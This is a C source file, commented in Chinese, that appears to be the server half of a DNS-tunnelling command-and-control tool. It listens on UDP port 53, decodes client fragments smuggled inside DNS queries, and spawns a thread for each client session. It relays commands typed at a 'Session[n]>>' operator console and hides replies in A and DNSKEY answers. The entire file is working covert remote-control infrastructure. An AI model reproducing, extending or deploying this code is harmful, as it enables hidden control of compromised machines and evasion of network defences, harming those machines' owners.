/*
* 根据clientid进行线程派发
*/
#include "../include/util.h"
#include "udp.h"
#include "dns.h"
#include "session.h"
#include "../include/cmd.h"
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include "app.h"
#include <pthread.h>
#include <sys/socket.h>
#include <stdio.h>

extern int s_currentSession;

__thread unsigned short g_tls_myclientid = 0; 

struct WorkerArgs
{
    unsigned short clientid;
    int sockfd;
    int pipefd;
};

void start_new_worker(unsigned short clientid);

void * gateway(void * arg)
{
    int fd = udp_bind(53);
    if (fd == -1)
    {
        exit(1);
    }

    char recvBuf[65536];
    while(1)
    {
        int hasData = wait_data(fd, 5);
        if(hasData == 0)
        {
            continue;
        }
        else if (hasData < 0)
        {
            perror("wait_data");
            break;
        }

        char addr[1][16];
        int recvLen = udp_recv(fd, recvBuf, sizeof(recvBuf), addr);
        if (recvLen <= 0)
        {
            return NULL;
        }
        
        #define BUFFLEN 260
        char * payload = (char *)malloc(BUFFLEN);
        int pureLen = processQuery(recvBuf, recvLen, payload, BUFFLEN);
        if (pureLen <= 0)//可能收到了一些其他报文，丢弃重试
        {
            free(payload);
            continue;
        }
        
        struct FragmentCtrl * frag = (struct FragmentCtrl *)payload;
        const char fragEndFlag = frag->end;
        const unsigned short clientid = ntohs(frag->clientID);

        //debug("gateway: clientid=%d, seqid=%d\n", clientid, frag->seqId);

        DataBuffer * data = (DataBuffer *)malloc(sizeof(DataBuffer));
        data->ptr = payload;
        data->len = pureLen; //FRAGMENT_CTRL + PAYLOAD
        int handler_fd = get_data_fd(clientid);
        if (handler_fd > 0)
        {
            if(write(handler_fd, &data, sizeof(DataBuffer *)) != sizeof(DataBuffer *))
            {
                freeDataBuffer(data);
                perror("write handler fd");
                continue;
            }

            if (wait_data(handler_fd, 1) == 0)
            {
                continue;
            }
            
            DataBuffer * databack = 0;
            if (read(handler_fd, &databack, sizeof(DataBuffer *)) != sizeof(DataBuffer *))
            {
                perror("read handler fd");
                continue;
            }

            {
                const char * rspData = databack->ptr;
                const int rspDataLen = databack->len;
                char * out = 0;
                int outlen = 0;
                if (!fragEndFlag)
                {
                    out = buildResponseA(recvBuf, recvLen, (unsigned int *)rspData, &outlen);
                }
                else//最后一个分片是DNSKEY QUERY
                {                    
                    out = buildResponseDnskey(recvBuf, recvLen, rspData, rspDataLen, &outlen);
                }

                udp_send(fd, out, outlen, addr);
            }

            freeDataBuffer(databack);
        }
        else 
        {
            //新启动线程，接收到SERVER_CMD_NEWSESSION时
            const struct CmdReq * req = (struct CmdReq *)(frag + 1);
            if (isNewSession(req))
            {
                debug("session establish for cliendid %d. next seqid %d\n", clientid, frag->seqId + 1);
                start_new_worker(clientid);
                sleep(1);
            }
            else
            {
                debug("Handlers discard clientid %d, seqid=%d, code=%d\n", clientid, frag->seqId, req->code);
            }
            
            freeDataBuffer(data);
        }
    }
    return NULL;
}

/*
gateway 根据clientid将数据包转发到对应的子线程conn_handler处理，转发使用管道通信
*/
void * conn_handler(void * arg)
{
    struct WorkerArgs * workarg = (struct WorkerArgs *)arg;
    const int datafd = workarg->sockfd;
    const int cmdfd = workarg->pipefd;
    g_tls_myclientid = workarg->clientid;
    free(arg);

    char dataReq[65536];
    char dataRsp[1024*1024];
    time_t freshTime = time(0);
    while (1)
    {
        if (time(0) - freshTime > 120)//超过2分钟没消息，退出线程
        {
            printf("session[%d] timeout\n", g_tls_myclientid);
            break;
        }
        
        int hasData = wait_data(datafd, 10);
        if (hasData == 0)
        {
            continue;
        }

        time(&freshTime);

        hasData = wait_data(cmdfd, 0);
        int datalen = 0;
        if (hasData == 1)
        {
            datalen = read(cmdfd, dataReq, sizeof(dataReq));
            if (datalen <= 0)
            {
                perror("read");
                continue;
            }
        }
        else if(hasData == 0)
        {
            ((struct CmdReq *)dataReq)->code = 0;
            datalen = 8;
        }
        
        int ret = server_send(datafd, dataReq, datalen);
        if(ret <= 0)
        {
            perror("server_send");
        }

        if (hasData)
        {
        recv:
            ret = server_recv(datafd, dataRsp, sizeof(dataRsp));
            if(ret > 0)
            {
                struct CmdReq * req = (struct CmdReq *)dataReq;
                struct CmdRsp * rsp = (struct CmdRsp *)dataRsp;
                if(rsp->sid != req->sid)
                    goto recv;

                parseCmdRsp(req, dataRsp, ret);
                printf("Session[%d]>>", g_tls_myclientid);
            }
        }
    }

    delete_session(g_tls_myclientid);
    close(cmdfd);
    close(datafd);
    return NULL;
}

void start_new_worker(unsigned short clientid)
{
    int sock_pair[2];
    int pipe_fds[2];
    if(socketpair(AF_LOCAL, SOCK_STREAM, 0, sock_pair) < 0) 
    { 
        perror("socketpair");
        return;
    }

    //printf("socketpair %d,%d\n", sock_pair[0], sock_pair[1]);
    if (pipe(pipe_fds) < 0)
    {
        perror("pipe");
        return;
    }
    
    /*
    创建2对FD，datafd用来gateway和conn_handler DNS包通信
    cmdfd用来命令行直接下发命令
    */
    struct WorkerArgs * args = (struct WorkerArgs *)malloc(sizeof(struct WorkerArgs));
    args->clientid = clientid;
    args->pipefd = pipe_fds[0];
    args->sockfd = sock_pair[0];

    pthread_t tid;
    if(pthread_create(&tid, NULL, conn_handler, (void *)args) != 0)
    {
        perror("pthread_create");
    }

    SessionEntry entry = {clientid, sock_pair[1], pipe_fds[1], 0, {0}};
    add_session(clientid, &entry);

    if (s_currentSession >= 0)
    {
        printf("\nNew session %d connected\nSession[%d]>>", clientid, s_currentSession);
    }
}
